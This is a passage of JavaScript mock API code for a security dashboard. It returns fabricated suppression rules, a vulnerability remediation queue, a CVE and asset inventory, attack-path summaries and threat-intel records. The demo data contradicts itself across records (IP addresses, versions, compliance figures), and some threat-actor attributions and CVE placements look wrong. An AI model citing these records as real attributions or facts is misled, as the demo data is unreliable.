    { id: 5, rule_name: 'Windows Update Noise', description: 'Suppress DNS query alerts for Windows Update CDN domains during patching cycle', status: 'active', owner: 'dave@corp.com', priority: 'low', suppression_type: 'rate_limit', scope: 'entire_environment', scope_value: null, time_type: 'maintenance_window', expires_at: null, conditions: JSON.stringify([{ field: 'domain', op: 'matches', value: '*.windowsupdate.com' }, { field: 'detection_name', op: 'contains', value: 'DNS Query' }]), exceptions: JSON.stringify([]), approval_status: 'not_required', approved_by: null, total_suppressed: 612, last_triggered_at: new Date(Date.now() - 3600000).toISOString(), created_by: 'dave@corp.com', created_at: new Date(Date.now() - 90 * 86400000).toISOString(), updated_at: new Date(Date.now() - 30 * 86400000).toISOString() },
    { id: 6, rule_name: 'Suppress All Ransomware Detections', description: 'DRAFT: Blanket suppression rule pending approval', status: 'draft', owner: 'alice@corp.com', priority: 'critical', suppression_type: 'full_suppress', scope: 'entire_environment', scope_value: null, time_type: 'until_date', expires_at: new Date(Date.now() + 30 * 86400000).toISOString(), conditions: JSON.stringify([{ field: 'mitre_technique', op: 'in', value: 'T1486,T1490,T1489' }]), exceptions: JSON.stringify([]), approval_status: 'pending', approved_by: null, total_suppressed: 0, last_triggered_at: null, created_by: 'alice@corp.com', created_at: new Date(Date.now() - 1 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 7, rule_name: 'Expiring — CI/CD Pipeline Noise', description: 'Suppress repeated process creation alerts from CI/CD runner accounts', status: 'active', owner: 'carol@corp.com', priority: 'medium', suppression_type: 'group_duplicates', scope: 'department', scope_value: 'DevOps', time_type: 'until_date', expires_at: new Date(Date.now() + 2 * 86400000).toISOString(), conditions: JSON.stringify([{ field: 'username', op: 'matches', value: 'runner-*' }, { field: 'detection_name', op: 'contains', value: 'Process Created' }]), exceptions: JSON.stringify([]), approval_status: 'not_required', approved_by: null, total_suppressed: 334, last_triggered_at: new Date(Date.now() - 1800000).toISOString(), created_by: 'carol@corp.com', created_at: new Date(Date.now() - 13 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
  ]);
  if (p === '/sup/audit')       return ok([
    { id: 1, rule_id: 1, rule_name: 'Backup Window Suppression', action: 'created', actor: 'alice@corp.com', details: 'Rule created in draft status', created_at: new Date(Date.now() - 30 * 86400000).toISOString() },
    { id: 2, rule_id: 1, rule_name: 'Backup Window Suppression', action: 'active', actor: 'alice@corp.com', details: 'Status changed to active', created_at: new Date(Date.now() - 29 * 86400000).toISOString() },
    { id: 3, rule_id: 2, rule_name: 'Sysadmin Scheduled Tasks', action: 'created', actor: 'bob@corp.com', details: 'Rule created in draft status', created_at: new Date(Date.now() - 45 * 86400000).toISOString() },
    { id: 4, rule_id: 3, rule_name: 'AV Scanner False Positive', action: 'modified', actor: 'alice@corp.com', details: 'Conditions updated — added MsMpEng.exe filter', created_at: new Date(Date.now() - 5 * 86400000).toISOString() },
    { id: 5, rule_id: 6, rule_name: 'Suppress All Ransomware Detections', action: 'created', actor: 'alice@corp.com', details: 'Rule created in draft status — approval required (critical priority)', created_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 6, rule_id: 2, rule_name: 'Sysadmin Scheduled Tasks', action: 'modified', actor: 'bob@corp.com', details: 'Added exception: domain_controllers', created_at: new Date(Date.now() - 3 * 86400000).toISOString() },
    { id: 7, rule_id: 5, rule_name: 'Windows Update Noise', action: 'active', actor: 'dave@corp.com', details: 'Status changed to active', created_at: new Date(Date.now() - 88 * 86400000).toISOString() },
  ]);
  if (p === '/sup/analytics')   return ok({ active_rules: 12, total_suppressed: 12940, analyst_hours_saved: 647, false_positive_rate: 94.2, most_suppressed_rules: [{ rule_name: 'Backup Window Suppression', suppressed: 4200, scope: 'asset_group', owner: 'alice@corp.com' }, { rule_name: 'Sysadmin Scheduled Tasks', suppressed: 1840, scope: 'department', owner: 'bob@corp.com' }, { rule_name: 'AV Scanner False Positive', suppressed: 972, scope: 'entire_environment', owner: 'alice@corp.com' }, { rule_name: 'Vuln Scanner Suppression', suppressed: 718, scope: 'asset_group', owner: 'carol@corp.com' }, { rule_name: 'Windows Update Noise', suppressed: 612, scope: 'entire_environment', owner: 'dave@corp.com' }], top_noisy_detections: [{ detection: 'Backup Process — PowerShell Execution', total: 4200, suppressed: 4200, rate_pct: 100 }, { detection: 'Scheduled Task Created — SYSTEM', total: 1980, suppressed: 1840, rate_pct: 92.9 }, { detection: 'LSASS Memory Access — AV Scanner', total: 1100, suppressed: 972, rate_pct: 88.4 }, { detection: 'Network Scan from Qualys', total: 720, suppressed: 718, rate_pct: 99.7 }, { detection: 'Windows Update DNS Queries', total: 640, suppressed: 612, rate_pct: 95.6 }], suppression_by_team: [{ team: 'SOC Team A', rules_created: 6, alerts_suppressed: 7200 }, { team: 'SOC Team B', rules_created: 3, alerts_suppressed: 2840 }, { team: 'IR Team', rules_created: 2, alerts_suppressed: 1920 }, { team: 'Cloud Security', rules_created: 1, alerts_suppressed: 980 }], false_positive_trend: [{ month: 'Apr', fps: 8400, suppressed: 6200 }, { month: 'May', fps: 7200, suppressed: 8100 }, { month: 'Jun', fps: 6100, suppressed: 9400 }, { month: 'Jul', fps: 4200, suppressed: 12900 }], suppression_effectiveness: { rules_with_zero_incidents: 11, rules_with_incidents: 1, avg_suppression_per_rule: 1058, coverage_pct: 91.7 } });

  // ── Vuln Queue Enterprise ─────────────────────────────────────────────────
  if (p === '/vq/dashboard')      return ok({ total: 12, unassigned: 2, assigned: 3, in_progress: 4, awaiting_verification: 1, verified: 0, closed: 0, overdue: 2, sla_compliance: 83.3, mttr_days: 8.4, team_breakdown: [{ team: 'Network Team', total: 4, overdue: 1 }, { team: 'Windows Team', total: 3, overdue: 0 }, { team: 'Linux Team', total: 2, overdue: 1 }, { team: 'Cloud Team', total: 2, overdue: 0 }, { team: 'DevOps Team', total: 1, overdue: 0 }] });
  if (p === '/vq/queue')          return ok([
    { id: 1, queue_id: 'VQ-2026-001', cve_id: 'CVE-2024-3400', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', asset_owner: 'alice@corp.com', business_unit: 'Infrastructure', priority: 'critical', risk_score: 98.4, status: 'overdue', assigned_team: 'Network Team', assigned_to: 'bob@corp.com', due_date: new Date(Date.now() - 3 * 86400000).toISOString(), sla_hours: 24, remediation_action: 'apply_patch', blocker_type: null, notes: 'KEV listed — CISA mandate', created_at: new Date(Date.now() - 5 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 2, queue_id: 'VQ-2026-002', cve_id: 'CVE-2024-21887', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', asset_owner: 'alice@corp.com', business_unit: 'Infrastructure', priority: 'critical', risk_score: 94.2, status: 'in_progress', assigned_team: 'Network Team', assigned_to: 'bob@corp.com', due_date: new Date(Date.now() + 2 * 86400000).toISOString(), sla_hours: 168, remediation_action: 'apply_patch', blocker_type: null, notes: 'Vendor patch testing', created_at: new Date(Date.now() - 14 * 86400000).toISOString(), updated_at: new Date(Date.now() - 2 * 86400000).toISOString() },
    { id: 3, queue_id: 'VQ-2026-003', cve_id: 'CVE-2021-44228', asset_name: 'WEB-APP-01', asset_ip: '203.0.113.55', asset_owner: 'carol@corp.com', business_unit: 'Application Services', priority: 'critical', risk_score: 91.8, status: 'blocked', assigned_team: 'Linux Team', assigned_to: 'dave@corp.com', due_date: new Date(Date.now() - 1 * 86400000).toISOString(), sla_hours: 168, remediation_action: null, blocker_type: 'vendor_patch_unavailable', notes: 'Waiting for Java upgrade approval', created_at: new Date(Date.now() - 180 * 86400000).toISOString(), updated_at: new Date(Date.now() - 3 * 86400000).toISOString() },
    { id: 4, queue_id: 'VQ-2026-004', cve_id: 'CVE-2023-36025', asset_name: 'WIN-LAPTOP-042', asset_ip: '10.10.1.42', asset_owner: 'eve@corp.com', business_unit: 'Finance', priority: 'high', risk_score: 82.1, status: 'assigned', assigned_team: 'Windows Team', assigned_to: 'frank@corp.com', due_date: new Date(Date.now() + 5 * 86400000).toISOString(), sla_hours: 168, remediation_action: null, blocker_type: null, notes: null, created_at: new Date(Date.now() - 8 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 5, queue_id: 'VQ-2026-005', cve_id: 'CVE-2024-26198', asset_name: 'DB-PROD-01', asset_ip: '10.20.1.11', asset_owner: 'grace@corp.com', business_unit: 'Data Engineering', priority: 'high', risk_score: 79.3, status: 'in_progress', assigned_team: 'Windows Team', assigned_to: 'henry@corp.com', due_date: new Date(Date.now() + 10 * 86400000).toISOString(), sla_hours: 168, remediation_action: 'apply_patch', blocker_type: null, notes: 'Maintenance window scheduled for Saturday', created_at: new Date(Date.now() - 6 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 6, queue_id: 'VQ-2026-006', cve_id: 'CVE-2021-44228', asset_name: 'EKS-CLUSTER-01', asset_ip: '10.30.0.1', asset_owner: 'ivan@corp.com', business_unit: 'DevOps', priority: 'critical', risk_score: 91.8, status: 'overdue', assigned_team: 'DevOps Team', assigned_to: 'ivan@corp.com', due_date: new Date(Date.now() - 1 * 86400000).toISOString(), sla_hours: 168, remediation_action: null, blocker_type: 'requires_reboot', notes: 'Kubernetes drain required', created_at: new Date(Date.now() - 20 * 86400000).toISOString(), updated_at: new Date(Date.now() - 4 * 86400000).toISOString() },
    { id: 7, queue_id: 'VQ-2026-007', cve_id: 'CVE-2023-46805', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', asset_owner: 'alice@corp.com', business_unit: 'Infrastructure', priority: 'high', risk_score: 75.2, status: 'awaiting_verification', assigned_team: 'Network Team', assigned_to: 'bob@corp.com', due_date: new Date(Date.now() + 7 * 86400000).toISOString(), sla_hours: 168, remediation_action: 'apply_patch', blocker_type: null, notes: 'Patch applied — awaiting rescan', created_at: new Date(Date.now() - 10 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 8, queue_id: 'VQ-2026-008', cve_id: 'CVE-2024-0519', asset_name: 'WIN-LAPTOP-042', asset_ip: '10.10.1.42', asset_owner: 'eve@corp.com', business_unit: 'Finance', priority: 'medium', risk_score: 54.3, status: 'unassigned', assigned_team: null, assigned_to: null, due_date: new Date(Date.now() + 28 * 86400000).toISOString(), sla_hours: 720, remediation_action: null, blocker_type: null, notes: null, created_at: new Date(Date.now() - 2 * 86400000).toISOString(), updated_at: new Date(Date.now() - 2 * 86400000).toISOString() },
  ]);
  if (/^\/vq\/items\/\d+\/dependencies$/.test(p)) return ok([
    { id: 1, blocker_type: 'maintenance_window', notes: 'Next window scheduled Saturday 02:00 UTC', status: 'open', created_at: new Date(Date.now() - 2 * 86400000).toISOString() },
  ]);
  if (/^\/vq\/items\/\d+$/.test(p))   return ok({ id: 1, queue_id: 'VQ-2026-001', cve_id: 'CVE-2024-3400', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', asset_owner: 'alice@corp.com', business_unit: 'Infrastructure', priority: 'critical', risk_score: 98.4, status: 'overdue', assigned_team: 'Network Team', assigned_to: 'bob@corp.com', due_date: new Date(Date.now() - 3 * 86400000).toISOString(), sla_hours: 24, remediation_action: 'apply_patch', blocker_type: null, blocker_notes: null, notes: 'KEV listed — CISA mandate', verified_at: null, closed_at: null, created_at: new Date(Date.now() - 5 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() });
  if (p === '/vq/exceptions')      return ok([
    { id: 1, vq_item_id: 3, cve_id: 'CVE-2021-44228', exception_type: 'temporary', reason: 'Log4j upgrade requires application regression testing — estimated 2 weeks', compensating_control: 'WAF rule deployed blocking JNDI lookup patterns, network segmentation applied', approver: 'ciso@corp.com', expiration_date: new Date(Date.now() + 14 * 86400000).toISOString(), review_schedule: 'weekly', status: 'approved', created_by: 'dave@corp.com', created_at: new Date(Date.now() - 7 * 86400000).toISOString() },
    { id: 2, vq_item_id: 8, cve_id: 'CVE-2024-0519', exception_type: 'risk_acceptance', reason: 'Chrome V8 vulnerability on isolated finance workstation with no internet access', compensating_control: 'AppLocker policy restricts executable paths, no internet browsing permitted', approver: null, expiration_date: new Date(Date.now() + 90 * 86400000).toISOString(), review_schedule: 'monthly', status: 'pending', created_by: 'eve@corp.com', created_at: new Date(Date.now() - 1 * 86400000).toISOString() },
  ]);
  if (p === '/vq/analytics')       return ok({ mttr_days: 8.4, sla_compliance: 94.2, overdue_count: 2, closed_count: 18, team_performance: [{ team: 'Network Team', assigned: 4, closed: 2, overdue: 1, avg_days: 6.2 }, { team: 'Windows Team', assigned: 3, closed: 3, overdue: 0, avg_days: 4.1 }, { team: 'Linux Team', assigned: 2, closed: 1, overdue: 1, avg_days: 12.3 }, { team: 'Cloud Team', assigned: 2, closed: 2, overdue: 0, avg_days: 3.7 }, { team: 'DevOps Team', assigned: 1, closed: 1, overdue: 0, avg_days: 2.1 }], remediation_trend: [{ week: 'W27', opened: 4, closed: 3 }, { week: 'W28', opened: 3, closed: 5 }, { week: 'W29', opened: 6, closed: 4 }, { week: 'W30', opened: 2, closed: 6 }], top_delayed_assets: [{ asset: 'VPN-GW-01', overdue_days: 3, assigned_team: 'Network Team' }, { asset: 'EKS-CLUSTER-01', overdue_days: 1, assigned_team: 'DevOps Team' }], sla_by_priority: [{ priority: 'critical', sla_hours: 24, avg_hours: 19.2, compliance_pct: 100 }, { priority: 'high', sla_hours: 168, avg_hours: 98.4, compliance_pct: 96.2 }, { priority: 'medium', sla_hours: 720, avg_hours: 312.1, compliance_pct: 91.4 }, { priority: 'low', sla_hours: 2160, avg_hours: 980.2, compliance_pct: 88.6 }] });
  if (p === '/vq/sla')             return ok({ policies: [{ priority: 'critical', time_to_assign_h: 2, time_to_start_h: 4, time_to_patch_h: 24, time_to_verify_h: 48, time_to_close_h: 72 }, { priority: 'high', time_to_assign_h: 8, time_to_start_h: 24, time_to_patch_h: 168, time_to_verify_h: 192, time_to_close_h: 240 }, { priority: 'medium', time_to_assign_h: 24, time_to_start_h: 72, time_to_patch_h: 720, time_to_verify_h: 744, time_to_close_h: 792 }, { priority: 'low', time_to_assign_h: 72, time_to_start_h: 168, time_to_patch_h: 2160, time_to_verify_h: 2184, time_to_close_h: 2208 }], current_compliance: { critical: 100.0, high: 96.2, medium: 91.4, low: 88.6 } });

  // ── Vulnerability Management Enterprise ──────────────────────────────────
  if (p === '/vm/dashboard')      return ok({ total: 31, critical: 6, high: 12, medium: 9, low: 4, exploitable: 8, actively_exploited: 3, patched: 24, overdue: 7, risk_score: 78.4, assets_affected: 12, kev_findings: 3, mttr_days: 14.2, patch_sla_compliance: 82.3 });
  if (p === '/vm/analytics')      return ok({ total: 31, critical: 6, high: 12, patched: 24, kev: 3, mttr_days: 14.2, patch_sla: 82.3, top_vulnerable_assets: [{ asset: 'VPN-GW-01', vuln_count: 3, critical: 2, risk_score: 98.4 }, { asset: 'WEB-APP-01', vuln_count: 7, critical: 1, risk_score: 84.2 }, { asset: 'DB-PROD-01', vuln_count: 5, critical: 1, risk_score: 79.1 }, { asset: 'WIN-LAPTOP-042', vuln_count: 12, critical: 0, risk_score: 61.3 }, { asset: 'EKS-CLUSTER-01', vuln_count: 4, critical: 1, risk_score: 76.8 }], top_cves: [{ cve: 'CVE-2024-3400', cvss: 10.0, epss: 0.974, kev: true, affected_assets: 1 }, { cve: 'CVE-2024-21887', cvss: 9.1, epss: 0.952, kev: true, affected_assets: 2 }, { cve: 'CVE-2021-44228', cvss: 10.0, epss: 0.991, kev: true, affected_assets: 4 }, { cve: 'CVE-2023-36025', cvss: 8.8, epss: 0.761, kev: true, affected_assets: 3 }, { cve: 'CVE-2024-26198', cvss: 8.8, epss: 0.652, kev: false, affected_assets: 5 }], risk_trend: [{ week: '06-23', critical: 8, high: 22, medium: 41 }, { week: '06-30', critical: 9, high: 24, medium: 38 }, { week: '07-07', critical: 7, high: 21, medium: 42 }, { week: '07-14', critical: 6, high: 19, medium: 39 }], patch_sla_breakdown: [{ severity: 'critical', sla_days: 7, avg_days: 9.2, on_time_pct: 62 }, { severity: 'high', sla_days: 30, avg_days: 22.4, on_time_pct: 81 }, { severity: 'medium', sla_days: 90, avg_days: 44.1, on_time_pct: 94 }, { severity: 'low', sla_days: 180, avg_days: 61.3, on_time_pct: 98 }] });
  if (p === '/vm/inventory')      return ok([
    { id: 1, cve_id: 'CVE-2024-3400', cvss_score: 10.0, epss_score: 0.974, epss_percentile: 97.4, kev_listed: true, severity: 'critical', vendor: 'Palo Alto Networks', product: 'PAN-OS GlobalProtect', affected_versions: '< 11.1.2-h3, < 11.0.4-h1, < 10.2.9-h1, < 10.1.14-h4', patch_available: true, actively_exploited: true, exploit_available: true, status: 'open', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', internet_facing: true, asset_criticality: 'critical', risk_score: 98.4, scan_type: 'network', detected_at: new Date(Date.now() - 5 * 86400000).toISOString(), published_at: '2024-04-12T00:00:00Z' },
    { id: 2, cve_id: 'CVE-2024-21887', cvss_score: 9.1, epss_score: 0.952, epss_percentile: 95.2, kev_listed: true, severity: 'critical', vendor: 'Ivanti', product: 'Connect Secure', affected_versions: 'All supported versions', patch_available: true, actively_exploited: true, exploit_available: true, status: 'open', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', internet_facing: true, asset_criticality: 'critical', risk_score: 94.2, scan_type: 'network', detected_at: new Date(Date.now() - 14 * 86400000).toISOString(), published_at: '2024-01-10T00:00:00Z' },
    { id: 3, cve_id: 'CVE-2021-44228', cvss_score: 10.0, epss_score: 0.991, epss_percentile: 99.1, kev_listed: true, severity: 'critical', vendor: 'Apache', product: 'Log4j', affected_versions: '2.0-beta9 to 2.14.1', patch_available: true, actively_exploited: true, exploit_available: true, status: 'open', asset_name: 'WEB-APP-01', asset_ip: '203.0.113.55', internet_facing: true, asset_criticality: 'high', risk_score: 91.8, scan_type: 'agent', detected_at: new Date(Date.now() - 180 * 86400000).toISOString(), published_at: '2021-12-10T00:00:00Z' },
    { id: 4, cve_id: 'CVE-2023-36025', cvss_score: 8.8, epss_score: 0.761, epss_percentile: 76.1, kev_listed: true, severity: 'high', vendor: 'Microsoft', product: 'Windows SmartScreen', affected_versions: 'Windows 10, 11, Server 2019, 2022', patch_available: true, actively_exploited: true, exploit_available: true, status: 'open', asset_name: 'WIN-LAPTOP-042', asset_ip: '10.0.1.88', internet_facing: false, asset_criticality: 'medium', risk_score: 74.3, scan_type: 'agent', detected_at: new Date(Date.now() - 30 * 86400000).toISOString(), published_at: '2023-11-14T00:00:00Z' },
    { id: 5, cve_id: 'CVE-2024-26198', cvss_score: 8.8, epss_score: 0.652, epss_percentile: 65.2, kev_listed: false, severity: 'high', vendor: 'Microsoft', product: 'Outlook', affected_versions: 'Microsoft 365, Outlook 2019, 2021', patch_available: true, actively_exploited: false, exploit_available: true, status: 'open', asset_name: 'WIN-LAPTOP-042', asset_ip: '10.0.1.88', internet_facing: false, asset_criticality: 'medium', risk_score: 62.1, scan_type: 'agent', detected_at: new Date(Date.now() - 21 * 86400000).toISOString(), published_at: '2024-03-12T00:00:00Z' },
    { id: 6, cve_id: 'CVE-2023-46805', cvss_score: 8.2, epss_score: 0.934, epss_percentile: 93.4, kev_listed: true, severity: 'high', vendor: 'Ivanti', product: 'Connect Secure', affected_versions: 'ICS 9.x, 22.x', patch_available: true, actively_exploited: true, exploit_available: true, status: 'deferred', asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', internet_facing: true, asset_criticality: 'critical', risk_score: 88.7, scan_type: 'network', detected_at: new Date(Date.now() - 45 * 86400000).toISOString(), published_at: '2024-01-10T00:00:00Z' },
    { id: 7, cve_id: 'CVE-2024-0519', cvss_score: 8.8, epss_score: 0.881, epss_percentile: 88.1, kev_listed: true, severity: 'high', vendor: 'Google', product: 'Chrome V8', affected_versions: 'Chrome < 120.0.6099.224', patch_available: true, actively_exploited: true, exploit_available: true, status: 'patched', asset_name: 'WIN-LAPTOP-042', asset_ip: '10.0.1.88', internet_facing: false, asset_criticality: 'medium', risk_score: 45.2, scan_type: 'agent', detected_at: new Date(Date.now() - 60 * 86400000).toISOString(), published_at: '2024-01-16T00:00:00Z' },
  ]);
  if (/^\/vm\/findings\/\d+$/.test(p)) return ok({ id: 1, cve_id: 'CVE-2024-3400', cvss_score: 10.0, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', epss_score: 0.974, epss_percentile: 97.4, kev_listed: true, kev_date_added: '2024-04-12', severity: 'critical', description: 'A command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.', vendor: 'Palo Alto Networks', product: 'PAN-OS GlobalProtect', affected_versions: '< 11.1.2-h3, < 11.0.4-h1, < 10.2.9-h1, < 10.1.14-h4', fixed_version: '11.1.2-h3 / 11.0.4-h1 / 10.2.9-h1 / 10.1.14-h4', patch_available: true, patch_url: 'https://security.paloaltonetworks.com/CVE-2024-3400', actively_exploited: true, exploit_available: true, exploit_maturity: 'weaponized', malware_families: 'UPSTYLE backdoor', threat_actors: 'UTA0218 (Volt Typhoon)', cisa_advisory: 'CISA Alert AA24-103A', status: 'open', asset_id: 1, asset_name: 'VPN-GW-01', asset_ip: '203.0.113.42', internet_facing: true, asset_criticality: 'critical', risk_score: 98.4, scan_type: 'network', detected_at: new Date(Date.now() - 5 * 86400000).toISOString(), published_at: '2024-04-12T00:00:00Z', patch_released_at: '2024-04-14T00:00:00Z', patched_at: null, verified_at: null });
  if (/^\/vm\/assets\/\d+$/.test(p)) return ok({ id: 1, hostname: 'VPN-GW-01', ip_address: '203.0.113.42', os: 'PAN-OS', os_version: '10.1.3', owner: 'network-ops@corp.com', business_unit: 'IT Infrastructure', internet_facing: true, risk_score: 98.4, criticality: 'critical', asset_value: 'critical', network_zone: 'DMZ', installed_software: 'PAN-OS 10.1.3,GlobalProtect Gateway 6.1', running_services: 'GlobalProtect (4443/tcp),HTTPS (443/tcp),SSH (22/tcp),BGP (179/tcp)', open_ports: '22,443,4443,179', business_application: 'Corporate VPN — Primary remote access gateway for 2,400 employees', vuln_count: 3, critical_count: 2, high_count: 1, last_scanned_at: new Date(Date.now() - 86400000).toISOString() });
  if (p === '/vm/assets')         return ok([
    { id: 1, hostname: 'VPN-GW-01', ip_address: '203.0.113.42', os: 'PAN-OS', os_version: '10.1.3', owner: 'network-ops@corp.com', business_unit: 'IT Infrastructure', internet_facing: true, risk_score: 98.4, criticality: 'critical', asset_value: 'critical', network_zone: 'DMZ', vuln_count: 3, critical_count: 2, high_count: 1, last_scanned_at: new Date(Date.now() - 86400000).toISOString() },
    { id: 2, hostname: 'WEB-APP-01', ip_address: '203.0.113.55', os: 'Ubuntu', os_version: '22.04 LTS', owner: 'devops@corp.com', business_unit: 'Engineering', internet_facing: true, risk_score: 84.2, criticality: 'high', asset_value: 'high', network_zone: 'DMZ', vuln_count: 7, critical_count: 1, high_count: 3, last_scanned_at: new Date(Date.now() - 2 * 86400000).toISOString() },
    { id: 3, hostname: 'DB-PROD-01', ip_address: '10.0.5.20', os: 'Windows Server', os_version: '2019', owner: 'dba@corp.com', business_unit: 'IT Operations', internet_facing: false, risk_score: 79.1, criticality: 'critical', asset_value: 'critical', network_zone: 'Database Segment', vuln_count: 5, critical_count: 1, high_count: 2, last_scanned_at: new Date(Date.now() - 3 * 86400000).toISOString() },
    { id: 4, hostname: 'WIN-LAPTOP-042', ip_address: '10.0.1.88', os: 'Windows', os_version: '11 22H2', owner: 'j.wilson@corp.com', business_unit: 'Finance', internet_facing: false, risk_score: 61.3, criticality: 'medium', asset_value: 'medium', network_zone: 'User Segment', vuln_count: 12, critical_count: 0, high_count: 4, last_scanned_at: new Date(Date.now() - 86400000).toISOString() },
    { id: 5, hostname: 'EKS-CLUSTER-01', ip_address: '10.0.10.0/24', os: 'Amazon Linux', os_version: '2023', owner: 'cloud-ops@corp.com', business_unit: 'Engineering', internet_facing: true, risk_score: 76.8, criticality: 'high', asset_value: 'high', network_zone: 'AWS/Cloud', vuln_count: 4, critical_count: 1, high_count: 1, last_scanned_at: new Date(Date.now() - 4 * 86400000).toISOString() },
  ]);
  if (p === '/vm/attack-surface') return ok({ internet_exposed_assets: 4, open_ports_total: 127, exposed_services: [{ service: 'HTTPS', port: 443, assets: 3, certificates: 3, cert_expiry_days: 87 }, { service: 'VPN (GlobalProtect)', port: 4443, assets: 1, vulnerable_version: true, cve: 'CVE-2024-3400' }, { service: 'SSH', port: 22, assets: 2, auth: 'password+key' }, { service: 'RDP', port: 3389, assets: 1, risk: 'high', notes: 'Should not be internet-facing' }, { service: 'SMB', port: 445, assets: 1, risk: 'critical', notes: 'SMB exposed to internet — immediate risk' }], certificates: [{ domain: 'vpn.corp.local', issuer: 'DigiCert', valid_until: new Date(Date.now() + 87 * 86400000).toISOString().split('T')[0], days_remaining: 87, strength: 'RSA-2048' }, { domain: 'app.corp.local', issuer: "Let's Encrypt", valid_until: new Date(Date.now() + 24 * 86400000).toISOString().split('T')[0], days_remaining: 24, strength: 'ECDSA-256' }, { domain: 'portal.corp.local', issuer: "Let's Encrypt", valid_until: new Date(Date.now() - 3 * 86400000).toISOString().split('T')[0], days_remaining: -3, strength: 'RSA-2048', expired: true }], dns_exposure: [{ record: 'vpn.corp.com', type: 'A', value: '203.0.113.42', exposed: true }, { record: 'app.corp.com', type: 'A', value: '203.0.113.55', exposed: true }, { record: 'internal.corp.com', type: 'A', value: '10.0.1.100', exposed: false, risk: 'subdomain_takeover_potential' }], firewall_exposure: [{ rule: 'ALLOW ANY → 0.0.0.0/0:3389 (RDP)', risk: 'critical', recommendation: 'Restrict to VPN CIDR only' }, { rule: 'ALLOW ANY → 0.0.0.0/0:445 (SMB)', risk: 'critical', recommendation: 'Block immediately' }, { rule: 'ALLOW ANY → 0.0.0.0/0:443 (HTTPS)', risk: 'low', recommendation: 'OK — web traffic' }], vpn_exposure: { product: 'Palo Alto GlobalProtect', version: '9.1.3', cve_count: 3, critical_cves: ['CVE-2024-3400'] } });
  if (p === '/vm/attack-paths')   return ok([{ id: 1, name: 'Internet → VPN → Internal Network → Domain Controller', risk: 'critical', exploitability: 'confirmed', steps: [{ node: 'Internet', type: 'source', description: 'Attacker on public internet' }, { node: 'VPN Gateway (vpn.corp.com)', type: 'entry', ip: '203.0.113.42', cve: 'CVE-2024-3400', cvss: 10.0, description: 'OS command injection — unauthenticated RCE' }, { node: 'Internal Network (10.0.0.0/16)', type: 'pivot', description: 'Full network access from compromised VPN gateway' }, { node: 'DB-PROD-01 (10.0.5.20)', type: 'target', description: 'Lateral movement via SMB/WMI, credential dumping', cve: 'CVE-2023-23397' }, { node: 'Domain Admin', type: 'objective', description: 'DCSync attack → full AD compromise' }] }, { id: 2, name: 'Internet → Web App → Database', risk: 'high', exploitability: 'probable', steps: [{ node: 'Internet', type: 'source', description: 'Attacker on public internet' }, { node: 'Web App (app.corp.com)', type: 'entry', ip: '203.0.113.55', description: 'Log4Shell (CVE-2021-44228) — unauthenticated RCE', cve: 'CVE-2021-44228' }, { node: 'App Server (APP-SRV-01)', type: 'pivot', description: 'Code execution as service account' }, { node: 'Database (DB-PROD-01)', type: 'target', description: 'Database accessible from app server segment — data exfiltration' }] }, { id: 3, name: 'Phishing → Workstation → Lateral → DC', risk: 'high', exploitability: 'confirmed', steps: [{ node: 'Phishing Email', type: 'source', description: 'Malicious attachment targeting finance team' }, { node: 'WIN-LAPTOP-042', type: 'entry', description: 'Malware execution — SmartScreen bypass', cve: 'CVE-2023-36025' }, { node: 'Internal Segment', type: 'pivot', description: 'Lateral movement via SMB / WMI / RDP' }, { node: 'Domain Controller', type: 'target', description: 'Pass-the-hash → Domain Admin elevation' }] }]);
  if (p === '/vm/threat-intel')   return ok({ kev_catalog: [{ cve: 'CVE-2024-3400', vendor: 'Palo Alto Networks', product: 'PAN-OS', date_added: '2024-04-12', due_date: '2024-04-19', notes: 'OS command injection in GlobalProtect — actively exploited by threat actors' }, { cve: 'CVE-2024-21887', vendor: 'Ivanti', product: 'Connect Secure', date_added: '2024-01-10', due_date: '2024-01-24', notes: 'Command injection — exploited since Jan 2024' }, { cve: 'CVE-2021-44228', vendor: 'Apache', product: 'Log4j', date_added: '2021-12-10', due_date: '2021-12-24', notes: 'Log4Shell — still actively exploited in 2026' }], active_exploitation: [{ cve: 'CVE-2024-3400', threat_actor: 'UTA0218 (Volt Typhoon)', malware: 'UPSTYLE', campaign: 'Operation MidnightEclipse', first_observed: '2024-03-26' }, { cve: 'CVE-2024-21887', threat_actor: 'UNC5325', malware: 'LITTLELAMB.WOOLTEA', campaign: 'Ivanti Connect Secure Mass Exploitation', first_observed: '2024-01-10' }], exploit_availability: [{ cve: 'CVE-2024-3400', maturity: 'weaponized', public_poc: true, metasploit: true, exploit_db: true }, { cve: 'CVE-2024-21887', maturity: 'weaponized', public_poc: true, metasploit: true, exploit_db: false }, { cve: 'CVE-2024-26198', maturity: 'proof_of_concept', public_poc: true, metasploit: false, exploit_db: false }, { cve: 'CVE-2023-36025', maturity: 'weaponized', public_poc: true, metasploit: true, exploit_db: true }], threat_actors: [{ name: 'UTA0218', aliases: 'Volt Typhoon', country: 'China', motivation: 'espionage', target_sectors: 'government,defense,telecom', ttps: 'CVE-2024-3400,living-off-the-land' }, { name: 'UNC5325', country: 'China', motivation: 'espionage', target_sectors: 'defense,technology', ttps: 'CVE-2024-21887,custom-malware' }, { name: 'LockBit 3.0', country: 'Russia/CIS', motivation: 'financial', target_sectors: 'healthcare,finance,critical-infrastructure', ttps: 